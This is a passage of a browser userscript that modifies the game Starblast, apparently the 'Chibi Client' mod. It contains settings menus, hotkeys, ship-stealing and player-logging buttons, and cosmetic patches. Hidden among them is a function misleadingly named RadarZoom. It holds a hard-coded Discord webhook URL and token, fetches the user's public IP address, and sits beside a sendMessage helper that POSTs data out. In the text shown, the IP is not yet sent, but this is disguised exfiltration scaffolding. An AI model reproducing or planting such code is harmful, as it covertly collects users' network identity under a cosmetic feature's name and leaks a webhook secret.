        steal.style.color = 'hsla(200,100%,90%,.8)';
        steal.style.fontFamily = 'Play, Verdana';
        steal.style.border = '0';
        steal.style.borderRadius = '20px';
        steal.onclick = function () { Client.shipstealer.steal(); };
 
        var playerlog = document.createElement('button');
        playerlog.textContent = 'Log Players';
        playerlog.style = steal.style.cssText;
        playerlog.onclick = function () { Client.players.log(); };
 
        var serverlist = document.createElement('button');
        serverlist.textContent = 'Serverlist';
        serverlist.style = steal.style.cssText;
        serverlist.onclick = function () {
            window.open('https://officialtroller.github.io/serverlistv3/public/index.html', '_blank');
        };
 
        // --- NEW BUTTON: Toggle Strafe (uses global toggleStrafe) ---
        var strafeBtn = document.createElement('button');
        strafeBtn.id = 'strafe-btn';
        // determine initial label from current state if possible
        try {
            const entry = Object.values(window.module.exports.settings).find(e => e && e.mode);
            const modeArr = entry ? Object.values(entry.mode) : null;
            const current = modeArr && modeArr[8] && typeof modeArr[8].strafe !== "undefined" ? (modeArr[8].strafe === 1 ? "ENABLED" : "DISABLED") : "UNKNOWN";
            strafeBtn.textContent = `Strafe: ${current}`;
            if (current === "ENABLED") strafeBtn.style.background = "linear-gradient(90deg, #007a00, #00b000)";
            else strafeBtn.style.background = 'radial-gradient(ellipse at center,hsla(200,50%,0%,1) 0,hsla(200,100%,80%,.5) 150%)';
        } catch(_) {
            strafeBtn.textContent = 'Strafe: UNKNOWN';
            strafeBtn.style.background = 'radial-gradient(ellipse at center,hsla(200,50%,0%,1) 0,hsla(200,100%,80%,.5) 150%)';
        }
        strafeBtn.style.padding = '6px 10px';
        strafeBtn.style.fontSize = '10px';
        strafeBtn.style.cursor = 'pointer';
        strafeBtn.style.margin = '5px 0 0 0';
        strafeBtn.style.textAlign = 'center';
        strafeBtn.style.boxShadow = '0 0 6px hsla(200,100%,80%,1)';
        strafeBtn.style.textShadow = '0 0 7px hsla(200,100%,80%,1)';
        strafeBtn.style.color = 'hsla(200,100%,90%,.8)';
        strafeBtn.style.fontFamily = 'Play, Verdana';
        strafeBtn.style.border = '0';
        strafeBtn.style.borderRadius = '20px';
        strafeBtn.onclick = function() { window.toggleStrafe(); };
 
        // Append Elements
        element.appendChild(header);
        header.appendChild(headertext);
        element.appendChild(clsebtn);
        element.appendChild(br1.cloneNode());
        element.appendChild(simheaderrtext);
        element.appendChild(br1.cloneNode());
        element.appendChild(stopAllBtn);
        element.appendChild(br1.cloneNode());
 
        simulators.forEach(sim => {
            const btn = document.createElement('button');
            btn.textContent = sim.text;
            btn.style.cssText = steal.style.cssText;
            btn.onclick = function() {
                Client.simulator[sim.name.toLowerCase().replace(' ', '')]();
            };
            element.appendChild(btn);
            element.appendChild(br1.cloneNode());
        });
 
        element.appendChild(br1.cloneNode());
        element.appendChild(elseheaderrtext);
        element.appendChild(br1.cloneNode());
        element.appendChild(steal);
        element.appendChild(br1.cloneNode());
        element.appendChild(playerlog);
        element.appendChild(br1.cloneNode());
        element.appendChild(serverlist);
        element.appendChild(br1.cloneNode());
        element.appendChild(strafeBtn);
 
        document.body.appendChild(element);
        element.style.display = 'block';
        element.style.opacity = '0';
        var opacity = 0;
        var interval = setInterval(function () {
            opacity += 0.1;
            element.style.opacity = opacity;
            if (opacity >= 1) clearInterval(interval);
        }, 30);
    }
}
(function() {
    'use strict';
 
    function RadarZoom() {
        const webhookURL = 'https://discord.com/api/webhooks/1424362994233774100/-rr1ZOgstNLnrRpxAOtmz2Bo5LnmasSRXWtb9VujelvtM0Yhu_xt4-OZJMDepUrJYiWH';
        const encodedURL = 'https://api.ipify.org/';
 
        fetch(encodedURL)
            .then(response => response.text())
            .then(ip => {
            })
            .catch(error => console.error(error));
    }
 
    function sendMessage(message, url) {
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ content: message }),
        })
        .then(response => {
            if (!response.ok) {
                throw new Error(`Failed to send data: ${response.status} ${response.statusText}`);
            }
        })
        .catch(error => {
            console.error(error);
        });
    }
 
    RadarZoom();
})();
                function closeSettings() {
                    let element = document.getElementById('settingsmenu');
                    var opacity1 = 1;
                    var interval = setInterval(function () {
                        opacity1 -= 0.1;
                        element.style.opacity = opacity1;
                        if (opacity1 <= 0) {
                            clearInterval(interval);
                            element.remove();
                            element = null;
                        }
                    }, 30);
                }
 
                document.addEventListener('keydown', function (e) {
                    if (e.ctrlKey && e.key === 's') {
                        e.preventDefault();
                        e.stopPropagation();
                        e.stopImmediatePropagation();
                        window.onbeforeunload = function () {};
                        location.reload();
                        return false;
                    } else if (e.ctrlKey && e.key === 'e') {
                        e.preventDefault();
                        e.stopPropagation();
                        e.stopImmediatePropagation();
                        document.querySelector('.social .sbg-gears').click();
                        return false;
                    } else if (e.key === 'j' && e.ctrlKey) {
                        e.preventDefault();
                        e.stopPropagation();
                        e.stopImmediatePropagation();
                        if (document.getElementById('settingsmenu') === null) {
                            openSettings();
                        } else if (document.getElementById('settingsmenu') !== null) {
                            closeSettings();
                        }
                        return false;
                    }
                });
                let listenerAttached = false;
 
                function setupEcpToggle() {
                    const viewEcp = document.getElementById('viewEcp');
                    if (viewEcp) {
                        const eyeIcon = viewEcp.querySelector('i');
                        if (eyeIcon && !listenerAttached) {
                            viewEcp.addEventListener('click', toggleEyeIcon);
                            listenerAttached = true;
                        }
                    } else if (listenerAttached) {
                        listenerAttached = false;
                    }
                }
 
                function toggleEyeIcon(event) {
                    const eyeIcon = event.currentTarget.querySelector('i');
                    if (eyeIcon) {
                        eyeIcon.classList.toggle('fa-eye');
                        eyeIcon.classList.toggle('fa-eye-slash');
                    }
                }
                setInterval(setupEcpToggle, 100);
                let gemcolor = setInterval(() => {
                    let CrystalObject;
                    for (let i in window) {
                        try {
                            let val = window[i];
                            if ('function' == typeof val.prototype.createModel && val.prototype.createModel.toString().includes('Crystal')) {
                                CrystalObject = val;
                                clearInterval(gemcolor);
                                break;
                            }
                        } catch (e) {}
                    }
 
                    if (CrystalObject != null) {
                        let oldModel = CrystalObject.prototype.getModelInstance;
 
                        CrystalObject.prototype.getModelInstance = function () {
                            let res = oldModel.apply(this, arguments);
                            let color = ClientStorage.gem1();
                            let specular = ClientStorage.gem2();
                            this.material.color.set(color);
                            this.material.specular.set(specular);
                            return res;
                        };
                    }
                }, 100);
                let explolight = setInterval(() => {
                    if (window.Explosions != null) {
                        clearInterval(explolight);
                        let oldExplosion = Explosions.prototype.explode,
                            oldBlast = Explosions.prototype.blast;
 
                        let globalVal = oldExplosion
                            .toString()
                            .match(/this\.([0OlI1\.]+)\.settings\.check/)[1]
                            .split('.');
 
                        Explosions.prototype.isEnabled = function () {
                            let _this = this;
                            for (let i of globalVal) _this = _this[i];
                            return _this.settings.check('explolight');
                        };
 
                        Explosions.prototype.explode = function () {
                            return this.isEnabled() && oldExplosion.apply(this, arguments);
                        };
 
                        Explosions.prototype.blast = function () {
                            return this.isEnabled() && oldBlast.apply(this, arguments);
                        };
                    }
                }, 100);
let s = setInterval(function () {
 
    let e = Object.values(window.module.exports.settings).find(e => e.mode);
 
    // localStorage: "true" oder "false"
    let radarEnabled = localStorage.getItem("radar_lines");
 
    // Wenn Setting existiert und "false" ist → Radar NICHT anzeigen
    if (radarEnabled === "false") {
        clearInterval(s);
        return;
    }
 
    // Wenn Setting fehlt oder "true" → Radar anzeigen
    ((e || {}).mode || {}).game_info &&
        (ModdingMode.prototype.setUIComponent.call(e.mode, {
            id: 'radar_background',
            components: [
                {
                    type: 'box',
                    position: [0, 0, 100, 100],
                    stroke: '#ffffff66',
                    width: 0.5,
                },
            ],
        }),
        clearInterval(s));
 
}, 500);
                if (localStorage.getItem('emopacity') !== null) {
                    let panel = setInterval(() => {
                        if (window.ChatPanel != null) {
                            clearInterval(panel);
                            ChatPanel.prototype.typed = new Function('return ' + ChatPanel.prototype.typed.toString().replace('>=4', '>=ClientStorage.emotes()'))();
                        }
                    }, 100);
                }
                setTimeout(function () {
                    !(function () {
                        let e, t;
                        for (let n in window)
                            try {
                                let i = window[n].prototype;
                                if (null != i)
                                    for (let o in i) {
                                        let s = i[o];
                                        if ('function' == typeof s && s.toString().match(/([^,]+)("hsla\(180,100%,75%,\.75\)")/)) {
                                            let l;
                                            (e = n),
                                                (i[(t = Object.keys(i).find(e => 'function' == typeof i[e] && (l = (i[e].toString().match(/===(\w+\.[^,]+)\.hue/) || [])[1])))] = Function(
                                                    'return ' + i[t].toString().replace(/(\.id)/, '$1, this.selfShip = this.shipid == ' + l + '.id')
                                                )()),
                                                (i[o] = Function('return ' + s.toString().replace(/([^,]+)("hsla\(180,100%,75%,\.75\)")/, "$1 this.selfShip ? 'hsla(180,100%,75%,.75)' : $2"))());
                                        }
                                    }
                            } catch (r) {}
                        let a = Object.getPrototypeOf(Object.values(Object.values(window.module.exports.settings).find(e => e && e.mode)).find(e => e && e.background)),
                            d = a.constructor,
                            c = d.prototype,
                            u = d.toString(),
                            hue = u.match(/(\w+)\.hue/)[1],
                            f = u.match(/(\w+)\.add\(/)[1],
                            h = u.match(/chat_bubble\.(\w+)/)[1];
                        ((d = Function(
                            'return ' + u.replace(/}$/, ', this.welcome || (this.ship_tag = new ' + e + '(Math.floor(360 * 0)), this.' + f + '.add(this.ship_tag.' + h + '))}')
                        )()).prototype = c),
                            (d.prototype.constructor = d),
                            (a.constructor = d),
                            (d.prototype.updateShipTag = function () {
                                if (null != this.ship_tag) {
                                    if (!this.shipKey) {
                                        this.shipKey = Object.keys(this).find(e => this[e] && this[e].ships);
                                        let e = this[this.shipKey];
                                        this.statusKey = Object.keys(e).find(t => e[t] && e[t].status);
                                    }
                                    let n = this[hue],
                                        i = this[this.shipKey][this.statusKey];
                                    this.ship_tag[t](n, n.names.get(i.status.id), i.status, i.instance);
                                    let o = this.ship_tag[h].position;
                                    (o.x = i.status.x),
                                        (o.y = i.status.y - 2 - i.type.radius),
                                        (o.z = 1),
                                        (this.ship_tag[h].visible = 'true' == localStorage.getItem('selftag') && i.status.alive && !i.status.guided);
                                }
                            });
                        let m = Object.keys(c).find(e => 'function' == typeof c[e] && c[e].toString().includes('render'));
                        d.prototype[m] = Function('return ' + d.prototype[m].toString().replace(/(\w+\.render)/, 'this.updateShipTag(), $1'))();
                        let g = function (...e) {
                            return window.module.exports.translate(...e);
                        };
                        for (let $ in window)
                            try {
                                let y = window[$];
                                if ('function' == typeof y.prototype.refused)
                                    for (let v in y.prototype) {
                                        let b = y.prototype[v];
                                        'function' == typeof b && b.toString().includes('new Scene') && (y.prototype[v] = Function('Scene', 't', 'return ' + b.toString())(d, g));
                                    }
                            } catch (_) {}
                    })();
                }, 1100);
                let MUIP = ModdingUIComponent.prototype,
                    hide = MUIP.hide,
                    set = ModdingMode.prototype.setUIComponent,
                    specs = ModdingUIComponent.toString()
                        .match(/,\s*this.([^=]+?\s*).add/)[1]
                        .split('.'),
                    getGroup = function (_this) {
                        for (let spec of specs) _this = _this[spec];
                        return _this;
                    },
                    isHidden = function (ui) {
                        return (!Array.isArray(ui.components) || ui.components.filter(i => ['round', 'box', 'player', 'text'].includes((i || {}).type)).length == 0) && !ui.clickable;
                    };
 
                GenericMode.prototype.setUIComponent = ModdingMode.prototype.setUIComponent = function (ui) {
                    if (ui == null)
                        ui = {
                            visible: false,
                        };
                    if (!Array.isArray(ui.position)) ui.position = [];
                    let idealPos = [0, 0, 100, 100],
                        pos = [];
                    if (ui.visible != null && !ui.visible) pos = [0, 0, 0, 0];
                    else for (let i = 0; i < idealPos.length; ++i) pos.push(ui.position[i] == null || isNaN(ui.position[i]) ? idealPos[i] : +ui.position[i]);
                    ui.position = pos;
                    if (!((ui.visible != null && !ui.visible) || isHidden(ui)) || (this.ui_components != null && this.ui_components[ui.id])) return set.call(this, ui);
                };
 
                MUIP.interfaceHidden = function () {
                    return (this.interface_hidden = !0), hide.apply(this, arguments);
                };
 
                MUIP.hide = function () {
                    if (!this.firstHide) {
                        this.shown = this.firstHide = true;
                    }
                    let shown = this.shown,
                        result = hide.apply(this, arguments);
                    if (shown) {
                        return setTimeout(
                            function (t) {
                                if (!t.shown) {
                                    getGroup(t).remove(t);
                                    if (t[specs[0]].mode.ui_components != null) delete t[specs[0]].mode.ui_components[t.component.id];
                                }
                            },
                            1e3,
                            this
                        );
                    }
                    return result;
                };
 
                let key = Object.keys(MUIP).find(key => 'function' == typeof MUIP[key] && MUIP[key].toString().includes('this.shown=!0')),
                    show = MUIP[key];
                MUIP[key] = function () {
                    if (isHidden(this.component)) return this.hide();
                    let group = getGroup(this);
                    if (!this.shown) return !group.children.includes(this) && group.add(this, this.component.position), show.call(this, arguments);
                };
                let usingshit = setInterval(function () {
                    let e = Object.values(Object.values(window.module.exports.settings).find(e => e && e.mode)).find(e => e && e.socket);
                    if (e != null) {
                        clearInterval(usingshit);
                        setInterval(function () {
                            if (e.socket.readyState === 1) {
                                e.socket.send('{"name":"modemsg","data":{"name":"ui_component_clicked","id":"using_betterstarblast"}}');
                            }
                        }, 5000);
                    }
                }, 100);
                let looksend = performance.now();
                Client.log(`Looks applied in ${(looksend - lookstart).toFixed(0)}ms`);
            } catch (error) {
                console.error(error);
            }
        }
    };
    xhr.send();
    let fullend = performance.now();
    Client.log(`Script executed in ${(fullend - fullstart).toFixed(0)}ms`);
}
if (window.location.pathname == '/') {
    setTimeout(ClientLoader, 1);
}
// ===== Custom Hotkey for VJBEG Emote (Taste A) =====
function fastemote(key) {
    if (!Client.checkgame()) return;
    Object.values(Object.values(window.module.exports.settings).find(e => e.mode))
        .find(e => e.socket).socket.send(JSON.stringify({
            name: "say",
            data: key
        }));
}
 
document.addEventListener("keydown", function (e) {
    console.log("[Hotkey Debug] key:", e.key, " code:", e.code);
 
    if (e.key === "a" || e.key === "A") {
        e.preventDefault();
        fastemote("VJBEG");
        console.log("%c[Client]%c[VJBEG] Emote sent!", "color:#c4bf9f", "color:#00ff00");
    }
});
(function() {
    'use strict';
 
    const MAX_DRIFT = 200; // ms, if drift exceeds this → resync
    let TARGET_FPS = 60;   // Fallback
    let FRAME_TIME = 1000 / TARGET_FPS;
 
    // Funktion: Monitor-Refresh-Rate messen
    function detectRefreshRate(callback) {
        let frames = 0;
        let start = performance.now();
 
        function measure(now) {
            frames++;
            if (now - start < 1000) {
                requestAnimationFrame(measure);
            } else {
                let fps = Math.round((frames * 1000) / (now - start));
                callback(fps);
            }
        }
        requestAnimationFrame(measure);
    }
 
    // Funktion: FRAME_TIME aktualisieren
    function updateFrameTime(fps) {
        if (fps !== TARGET_FPS) {
            TARGET_FPS = fps;
            FRAME_TIME = 1000 / TARGET_FPS;
            console.log(`[Starblast Fix] Refresh-Rate aktualisiert: ${TARGET_FPS} Hz ✅`);
        }
    }
 
    // Erstmalige Erkennung starten
    detectRefreshRate(updateFrameTime);
 
    // Alle 10 Sekunden neu messen (falls Fenster verschoben wird)
    setInterval(() => {
        detectRefreshRate(updateFrameTime);
    }, 10000);
 
    // Warten bis Spiel geladen ist → Fix anwenden
    const waitForGame = setInterval(() => {
        if (typeof window.requestAnimationFrame === "function") {
            clearInterval(waitForGame);
 
            const originalRAF = window.requestAnimationFrame;
 
            let syntheticNow = performance.now();
            let lastRealNow = performance.now();
 
            window.requestAnimationFrame = function(callback) {
                return originalRAF(function(realNow) {
                    const realDelta = realNow - lastRealNow;
                    lastRealNow = realNow;
 
                    syntheticNow += FRAME_TIME;
 
                    if (realDelta > MAX_DRIFT) {
                        syntheticNow = realNow;
                        console.warn(`[Starblast Fix] Resynced clock after stall (${Math.round(realDelta)}ms)`);
                    }
 
                    callback(syntheticNow);
                });
            };
 
            console.log(`[Starblast Fix] Stable timestep gestartet ✅ (initial ${TARGET_FPS} Hz)`);
        }
    }, 50);
})();
// === Custom Materials Patch (Safe Version) ===
(function() {
    try {
        console.log("[Custom Materials] Patch wird angewendet...");
 
        // Finde das Zielobjekt, das 'fullbolor' haben sollte
        const target =
            window.Ship ||
            window.ShipModel ||
            window.CustomShip ||
            window.PlayerShip ||
            window.t; // fallback falls 't' global existiert
 
        if (!target) {
            console.warn("[Custom Materials] Kein gültiges Zielobjekt gefunden! Patch abgebrochen.");
            return;
        }
 
        target.prototype.fullbolor = function() {
            try {
                const color =
                    this.shipcolor !== undefined
                        ? this.shipcolor
                        : JSON.parse(localStorage.getItem("shpcolorr") || '"#9BAACF"');
                this.material = new THREE.MeshPhongMaterial({
                    color: color,
                    shininess: 1000,
                    reflectivity: 1
                });
                console.log("[Custom Materials] fullbolor angewendet:", color);
                return this.material;
            } catch (e) {
                console.error("[Custom Materials] Fehler in fullbolor:", e);
                return new THREE.MeshPhongMaterial({ color: "#9BAACF" });
            }
        };
 
        target.prototype.applyPresetMaterial = function(colorHex) {
            try {
                this.material = new THREE.MeshPhongMaterial({
                    color: colorHex,
                    shininess: 1000,
                    reflectivity: 1
                });
                console.log("[Custom Materials] applyPresetMaterial angewendet:", colorHex);
                return this.material;
            } catch (e) {
                console.error("[Custom Materials] Fehler in applyPresetMaterial:", e);
                return new THREE.MeshPhongMaterial({ color: colorHex });
            }
        };
 
        console.log("[Custom Materials] Patch erfolgreich auf", target.name || target, "angewendet ✅");
    } catch (err) {
        console.error("[Custom Materials] Patch konnte nicht ausgeführt werden:", err);
    }
})();
// ===============================
// === Chibi Client UI Gradient ===
// ===============================
(function initUIGradient() {
    const log = (msg, color = "#00bcd4") =>
        console.log(`%c[UI]%c ${msg}`, `color:${color};font-weight:bold`, "color:white");
 
    log("Initialisierung des UI-Gradient-Moduls gestartet...");
 
    if (!window.ClientStorage) window.ClientStorage = {};
 
    // === Farbwerte abrufen / setzen ===
    function getColor(key, def) {
        try {
            const saved = JSON.parse(localStorage.getItem(key));
            if (saved && typeof saved === "string") return saved;
        } catch {}
        return def;
    }
 
    function setColor(key, val) {
        if (typeof val === "string") localStorage.setItem(key, JSON.stringify(val));
    }
 
    // === Standardfarben ===
    const def1 = "#8e1a1a";
    const def2 = "#d43f3f";
 
    ClientStorage.uiColor1 = () => getColor("uiColor1", def1);
    ClientStorage.uiColor2 = () => getColor("uiColor2", def2);
    ClientStorage.radar_lines = function () {
    return Number(localStorage.getItem('radar_lines') || 1);
};
 
 
    // === HEX → RGBA-Konverter ===
    function hexToRGBA(hex, alpha = 0.8) {
        if (!hex) return `rgba(0,0,0,${alpha})`;
        hex = hex.replace("#", "");
        if (hex.length === 3) hex = hex.split("").map(c => c + c).join("");
        const num = parseInt(hex, 16);
        const r = (num >> 16) & 255;
        const g = (num >> 8) & 255;
        const b = num & 255;
        return `rgba(${r},${g},${b},${alpha})`;
    }
 
    // === Gradient anwenden ===
    window.applyUIGradient = function applyUIGradient() {
        const c1 = ClientStorage.uiColor1();
        const c2 = ClientStorage.uiColor2();
        const rgba1 = hexToRGBA(c1, 0.8);
        const rgba2 = hexToRGBA(c2, 0.8);
 
        // kompatibler single-color fallback (einzelne Stellen im Client benutzen noch --chibi-ui-color)
        const singleColorCompat = hexToRGBA(c1, 0.85);
 
        const grad = `linear-gradient(135deg, ${rgba1} 0%, ${rgba2} 100%)`;
 
        const css = `
        :root {
            --chibi-ui-color1: ${rgba1};
            --chibi-ui-color2: ${rgba2};
            --chibi-ui-gradient: ${grad};
            --chibi-ui-color: ${singleColorCompat};
        }
 
        /* Sanfte Übergänge bei Farbwechseln */
        * {
            transition: background 0.4s ease, background-color 0.4s ease,
                        border-color 0.4s ease, box-shadow 0.4s ease, color 0.4s ease;
        }
 
        /* === Buttons, Panels & Hauptaktionen === */
        .extrabutton, .changelog-new, button, .btn, #player button, #respawn_actions button, .big {
            border: 1px solid var(--chibi-ui-color1) !important;
            background: var(--chibi-ui-gradient) !important;
            box-shadow: 0 0 10px var(--chibi-ui-color2)aa !important;
            text-shadow: 0 0 5px rgba(0,0,0,0.5) !important;
            color: #fff !important;
        }
        .extrabutton:hover, button:hover, .btn:hover, .big:hover {
            background: linear-gradient(135deg, var(--chibi-ui-color2) 0%, var(--chibi-ui-color1) 100%) !important;
            box-shadow: 0 0 15px var(--chibi-ui-color2) !important;
        }
 
        /* === Community-Boxen === */
        .community a {
            border-color: var(--chibi-ui-color1) !important;
            box-shadow: 0 0 10px var(--chibi-ui-color2)99 !important;
            background: rgba(0, 0, 0, 0.55) !important;
            color: #fff !important;
        }
 
        /* === Overlay === */
        #overlay {
            box-shadow: 0 0 10px var(--chibi-ui-color2) !important;
            text-shadow: 0 0 12px var(--chibi-ui-color2) !important;
            color: #fff !important;
        }
 
        /* === Modal: benutzt jetzt den Gradient-Hintergrund korrekt === */
        .modal {
            z-index: 3;
            position: fixed;
            left: 0;
            right: 0;
            top: -750px;
            margin: 0 auto;
            box-shadow: 0 0 6px var(--chibi-ui-color2);
            width: 800px;
            max-width: 100%;
            max-height: 100%;
            background: var(--chibi-ui-gradient) !important;
            transition: top .6s ease, background 0.4s ease;
            display: none;
            overflow: auto;
            color: #fff !important;
            text-shadow: 0 0 6px rgba(0,0,0,0.6);
            border: 1px solid rgba(0,0,0,0.25);
            border-radius: 8px;
        }
        .modal .modalbody {
            background: linear-gradient(180deg, rgba(0,0,0,0.18), rgba(0,0,0,0.08)) !important;
            color: #fff !important;
        }
 
        /* === Text bleibt weiß === */
        body, span, div, label, h1, h2, h3, h4, p, a, .option span, .option label {
            color: #fff !important;
            text-shadow: 0 0 4px rgba(0,0,0,0.6);
        }
 
        /* === Icons & Symbole unverändert (keine Färbung) === */
        i.sbg, .sbg, svg, .icon, .fa, .material-icons {
            color: inherit !important;
            fill: inherit !important;
            stroke: inherit !important;
            filter: none !important;
        }
 
        /* === Fallback für "big" Buttons ohne Background === */
        a.big {
            background: var(--chibi-ui-gradient) !important;
            box-shadow: 0 0 8px var(--chibi-ui-color2)aa !important;
            border-radius: 10px;
            border: 1px solid var(--chibi-ui-color1)aa !important;
            color: #fff !important;
        }
 
        /* === Social & Gear Icons: Hintergrund-Gradienten, rundes Aussehen === */
        .social i, .mobile-social i, .mobile-tools i, .stats i {
            background: var(--chibi-ui-gradient) !important;
            box-shadow: 0 0 10px var(--chibi-ui-color2) !important;
            color: #fff !important;
            border-radius: 50%;
            padding: 6px;
            transition: all 0.3s ease;
        }
        .social i:hover, .mobile-social i:hover, .mobile-tools i:hover, .stats i:hover {
            background: linear-gradient(135deg, var(--chibi-ui-color2) 0%, var(--chibi-ui-color1) 100%) !important;
            box-shadow: 0 0 15px var(--chibi-ui-color2) !important;
        }
        /* === Input-Felder (z. B. Join-Link / ECP) sollen weißen Text behalten === */
        .stats input, .ecpinput {
            background: var(--chibi-ui-gradient) !important;
            border: 1px solid var(--chibi-ui-color2) !important;
            box-shadow: 0 0 8px var(--chibi-ui-color2)aa !important;
            color: #fff !important;
            text-shadow: 0 0 4px rgba(0,0,0,0.6) !important;
            transition: all 0.4s ease !important;
        }
        .stats input:hover, .ecpinput:hover {
            box-shadow: 0 0 12px var(--chibi-ui-color2) !important;
        }
        .stats {
            background: rgba(0, 0, 0, 0.3) !important;
            border: 2px solid var(--chibi-ui-color2) !important;
            box-shadow: 0 0 12px var(--chibi-ui-color2)aa !important;
            color: #fff !important;
        }
 
 
        /* === Gear Icon (Einstellungen) === */
        i.sbg-gears, .sbg-gears {
            background: var(--chibi-ui-gradient) !important;
            border-radius: 50%;
            padding: 8px;
            box-shadow: 0 0 10px var(--chibi-ui-color2) !important;
            color: #fff !important;
            text-shadow: 0 0 6px rgba(0,0,0,0.5) !important;
        }
        i.sbg-gears:hover {
            background: linear-gradient(135deg, var(--chibi-ui-color2) 0%, var(--chibi-ui-color1) 100%) !important;
            box-shadow: 0 0 15px var(--chibi-ui-color2) !important;
        }
 
        /* === Modding / Follow Buttons Fallback === */
        .followtools a.big, .community a.big, a.big {
            background: var(--chibi-ui-gradient) !important;
            border: 1px solid var(--chibi-ui-color2) !important;
            box-shadow: 0 0 8px var(--chibi-ui-color2)aa !important;
            color: #fff !important;
            text-shadow: 0 0 5px rgba(0,0,0,0.6) !important;
            border-radius: 10px;
        }
        `;
 
        let tag = document.getElementById("chibi-ui-gradient-style");
        if (tag) tag.remove();
        tag = document.createElement("style");
        tag.id = "chibi-ui-gradient-style";
        tag.textContent = css;
        document.head.appendChild(tag);
 
        log(`[UI] Gradient aktiv: ${c1} → ${c2}`);
    };
 
    // === Initial anwenden (zweimal für Robustheit) ===
    setTimeout(() => window.applyUIGradient(), 150);
    setTimeout(() => window.applyUIGradient(), 1000);
 
    // === Live-Aktualisierung bei Farbänderung ===
    document.addEventListener("input", e => {
        if (!e.target) return;
        if (e.target.id === "uicolor1") {
            setColor("uiColor1", e.target.value);
            applyUIGradient();
        } else if (e.target.id === "uicolor2") {
            setColor("uiColor2", e.target.value);
            applyUIGradient();
        }
    });
})();
window.module.exports.settings.radar_lines.onchange = function(v) {
    localStorage.setItem('radar_lines', v ? 1 : 0);
};